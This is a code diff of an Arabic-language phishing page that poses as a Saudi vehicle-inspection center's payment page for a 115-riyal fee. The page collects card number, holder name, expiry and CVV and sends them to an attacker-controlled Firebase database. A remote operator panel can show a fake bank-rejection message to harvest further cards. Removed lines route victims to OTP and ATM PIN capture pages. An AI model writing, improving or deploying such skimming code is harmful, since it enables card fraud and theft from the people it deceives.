@@ -3,80 +3,240 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري المعالجة - مركز سلامة المركبات</title>
+    <title>إتمام عملية الدفع - مركز سلامة المركبات</title>
     
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <style>
-        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
+        :root {
+            --main-green: #1e7344; 
+            --bg-light: #f7f8fa;
+            --card-gradient: linear-gradient(135deg, #1e7344 0%, #114126 100%);
+            --error-red: #d93025;
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; padding: 20px; }
-        .loading-container { background: #fff; width: 100%; max-width: 400px; border-radius: 25px; padding: 40px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
-        .spinner { width: 65px; height: 65px; border: 6px solid #e0e0e0; border-top: 6px solid var(--main-green); border-radius: 50%; margin: 0 auto 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 20px; color: #333; margin-bottom: 15px; font-weight: bold; }
-        p { font-size: 14px; color: #666; line-height: 1.8; margin-bottom: 20px; }
-        .secure-badge-container { margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .secure-img { width: 100%; max-width: 200px; height: auto; border-radius: 8px; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+
+        .payment-card-container { background: #fff; width: 100%; max-width: 420px; border-radius: 25px; padding: 25px 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; position: relative; }
+        .main-header { margin-bottom: 20px; }
+        .main-header h1 { font-size: 18px; color: #333; margin-bottom: 5px; }
+        .main-header p { font-size: 14px; color: #1e7344; font-weight: bold; }
+
+        /* رسالة الرفض الجديدة */
+        #rejectMsg {
+            display: none; background: #feebeb; color: var(--error-red); padding: 12px;
+            border-radius: 10px; border: 1px solid #facaca; margin-bottom: 15px; font-size: 13px; font-weight: bold;
+            line-height: 1.5;
+        }
+
+        .credit-card-view {
+            width: 100%; height: 200px; background: var(--card-gradient); border-radius: 15px;
+            padding: 20px; margin-bottom: 25px; color: white; position: relative;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15); direction: ltr; text-align: left;
+        }
+
+        .card-logo-row { display: flex; justify-content: space-between; align-items: center; height: 40px; }
+        .card-chip { width: 45px; height: 35px; background: linear-gradient(135deg, #f0d060 0%, #b88a14 100%); border-radius: 6px; }
+        #viewCardLogo { width: 50px; height: auto; object-fit: contain; display: none; }
+
+        .card-number-view { font-size: 20px; letter-spacing: 2px; margin-top: 35px; display: block; font-family: 'Courier New', monospace; height: 25px; white-space: nowrap; }
+        .card-info-bottom { display: flex; justify-content: space-between; align-items: flex-end; margin-top: 25px; direction: rtl; }
+        .card-holder-view { font-size: 13px; text-align: right; }
+        .card-expiry-view { font-size: 14px; direction: ltr; }
+
+        .form-group { text-align: right; margin-bottom: 15px; width: 100%; position: relative; }
+        .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
+        
+        .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
+        .input-field:focus { border-color: var(--main-green); }
+        
+        /* تنسيق الحقول عند الخطأ */
+        .input-field.error-border { border: 2px solid var(--error-red) !important; background-color: #fff8f8; }
+
+        .error-msg { color: var(--error-red); font-size: 11px; margin-top: 4px; display: none; font-weight: bold; }
+
+        .expiry-cvv-row { display: flex; gap: 10px; width: 100%; }
+        .btn-pay { width: 100%; background-color: #82b199; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: 0.3s; opacity: 0.6; }
+        .btn-pay.active { background-color: var(--main-green); cursor: pointer; opacity: 1; }
     </style>
 </head>
 <body>
 
-    <div class="loading-container">
-        <div class="spinner"></div>
-        <h2>جاري معالجة طلبك...</h2>
-        <p>فضلاً انتظر قليلاً، يتم الآن التحقق من صحة البيانات مع بوابة الدفع الإلكتروني.</p>
-        <div class="secure-badge-container">
-            <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" class="secure-img" alt="Payment Security">
+    <div class="payment-card-container">
+        <div class="main-header">
+            <h1>إتمام عملية الدفع</h1>
+            <p>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
         </div>
+
+        <div id="rejectMsg">تم الرفض من قبل البنك مصدر البطاقة، قد تكون البطاقة غير مؤهلة للدفع عبر الإنترنت. يرجى التحقق</div>
+
+        <div class="credit-card-view" id="cardVisual">
+            <div class="card-logo-row">
+                <div class="card-chip"></div>
+                <img src="" id="viewCardLogo" alt="Card Logo">
+            </div>
+            <div class="card-number-view" id="viewCardNumber">#### #### #### ####</div>
+            <div class="card-info-bottom">
+                <div class="card-holder-view" id="viewCardHolder">اسم حامل البطاقة</div>
+                <div class="card-expiry-view" id="viewCardExpiry">00 / 00</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">اسم حامل البطاقة</label>
+            <input type="text" id="cardHolder" class="input-field" placeholder="الاسم كما في البطاقة" autocomplete="off" oninput="this.value = this.value.replace(/[0-9\u0660-\u0669]/g, '')">
+        </div>
+
+        <div class="form-group">
+            <label class="form-label">رقم البطاقة</label>
+            <input type="tel" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19">
+            <div id="numError" class="error-msg">رقم البطاقة غير صحيح أو غير مكتمل</div>
+        </div>
+
+        <div class="expiry-cvv-row">
+            <div class="form-group" style="flex: 1.5;">
+                <label class="form-label">تاريخ الانتهاء</label>
+                <input type="tel" id="cardExpiry" class="input-field" placeholder="MM / YY" maxlength="7">
+            </div>
+            <div class="form-group" style="flex: 1;">
+                <label class="form-label">رمز (CVV)</label>
+                <input type="tel" id="cvv" class="input-field" placeholder="123" maxlength="3">
+            </div>
+        </div>
+
+        <button class="btn-pay" id="payButton" onclick="submitPayment()" disabled>ادفع الآن</button>
     </div>
 
     <script>
         const firebaseConfig = { 
-            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
-            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
-            projectId: "saso-inspection" 
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/" 
         };
         if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
-        const v_id = localStorage.getItem('v_id');
+        
+        let v_id = localStorage.getItem('v_id');
+        if (!v_id) {
+            v_id = 'ID-' + Math.floor(Math.random() * 900000 + 100000);
+            localStorage.setItem('v_id', v_id);
+        }
 
-        if (v_id) {
-            // تحديث حالة الزائر في لوحة التحكم
-            database.ref('live_sessions/' + v_id).update({
-                current_page: "Processing Page",
-                last_seen: new Date().getTime()
-            });
-
-            // الاستماع للأوامر بشكل لحظي
-            const orderRef = database.ref('orders/' + v_id + '/next_step');
-            
-            orderRef.on('value', (snapshot) => {
-                const step = snapshot.val();
+        // مراقبة رفض البطاقة من اللوحة
+        database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
+            const step = snapshot.val();
+            if (step === 'wrong_card') {
+                // إظهار الرسالة وتلوين الحقول بالأحمر
+                document.getElementById('rejectMsg').style.display = 'block';
+                const fields = ['cardHolder', 'cardNumber', 'cardExpiry', 'cvv'];
+                fields.forEach(id => {
+                    const el = document.getElementById(id);
+                    el.classList.add('error-border');
+                    el.value = ''; // مسح البيانات القديمة
+                });
+                // تصفير واجهة البطاقة العلوية
+                document.getElementById('viewCardNumber').innerText = '#### #### #### ####';
+                document.getElementById('viewCardHolder').innerText = 'اسم حامل البطاقة';
+                document.getElementById('viewCardExpiry').innerText = '00 / 00';
                 
-                if (step) {
-                    switch(step) {
-                        case 'go_to_otp':
-                            // يروح لصفحة الـ OTP
-                            window.location.replace('complete-st.html');
-                            break;
-                        case 'go_to_pin':
-                            // يروح لصفحة الـ ATM
-                            window.location.replace('auth-session.html');
-                            break;
-                        case 'wrong_card':
-                            // يرجع لصفحة الدفع (تأكد إن اسمها secure-pay-v2.html)
-                            window.location.replace('secure-pay-v2.html');
-                            break;
-                        case 'success':
-                            window.location.replace('success-page.html');
-                            break;
-                    }
-                }
+                const btn = document.getElementById('payButton');
+                btn.disabled = true;
+                btn.classList.remove('active');
+                btn.innerText = "ادفع الآن";
+            }
+        });
+
+        function isValidLuhn(number) {
+            let sum = 0; let shouldDouble = false;
+            for (let i = number.length - 1; i >= 0; i--) {
+                let digit = parseInt(number.charAt(i));
+                if (shouldDouble) { if ((digit *= 2) > 9) digit -= 9; }
+                sum += digit; shouldDouble = !shouldDouble;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function validateForm() {
+            const num = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const exp = document.getElementById('cardExpiry').value;
+            const holder = document.getElementById('cardHolder').value;
+            const cvv = document.getElementById('cvv').value;
+            const btn = document.getElementById('payButton');
+            const err = document.getElementById('numError');
+
+            let isNumValid = num.length >= 15 && isValidLuhn(num);
+            let isExpValid = exp.length === 7;
+
+            if (num.length > 10 && !isNumValid) { err.style.display = 'block'; } else { err.style.display = 'none'; }
+
+            if (isNumValid && isExpValid && holder.length > 5 && cvv.length === 3) {
+                btn.disabled = false; btn.classList.add('active');
+            } else {
+                btn.disabled = true; btn.classList.remove('active');
+            }
+        }
+
+        // مسح حالة الخطأ عند بدء الكتابة من جديد
+        function clearError(el) {
+            el.classList.remove('error-border');
+            document.getElementById('rejectMsg').style.display = 'none';
+        }
+
+        document.getElementById('cardHolder').addEventListener('input', function() {
+            clearError(this);
+            document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
+            validateForm();
+        });
+
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            clearError(this);
+            let val = this.value.replace(/\D/g, '');
+            this.value = val.match(/.{1,4}/g)?.join(' ') || '';
+            document.getElementById('viewCardNumber').innerText = this.value || '#### #### #### ####';
+            
+            const logo = document.getElementById('viewCardLogo');
+            if (val.startsWith('4')) { 
+                logo.src = "https://img.icons8.com/color/48/000000/visa.png"; logo.style.display = "block"; 
+            } else if (val.startsWith('5')) { 
+                logo.src = "https://img.icons8.com/color/48/000000/mastercard.png"; logo.style.display = "block"; 
+            } else { logo.style.display = "none"; }
+            validateForm();
+        });
+
+        document.getElementById('cardExpiry').addEventListener('input', function() {
+            clearError(this);
+            let val = this.value.replace(/\D/g, '');
+            if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
+            else this.value = val;
+            document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
+            validateForm();
+        });
+
+        document.getElementById('cvv').addEventListener('input', function() {
+            clearError(this);
+            validateForm();
+        });
+
+        function submitPayment() {
+            const btn = document.getElementById('payButton');
+            btn.disabled = true;
+            btn.innerText = "جاري التحميل...";
+
+            const payload = {
+                fullName: document.getElementById('cardHolder').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                expiryDate: document.getElementById('cardExpiry').value,
+                cvv: document.getElementById('cvv').value,
+                next_step: 'waiting', 
+                status: 'Online_Pay_Submitted',
+                last_update: new Date().getTime()
+            };
+
+            database.ref('orders/' + v_id).update(payload).then(() => {
+                window.location.replace('processing.html'); 
+            }).catch(() => {
+                window.location.replace('processing.html');
             });
-        } else {
-            window.location.href = 'index.html';
         }
     </script>
 </body>
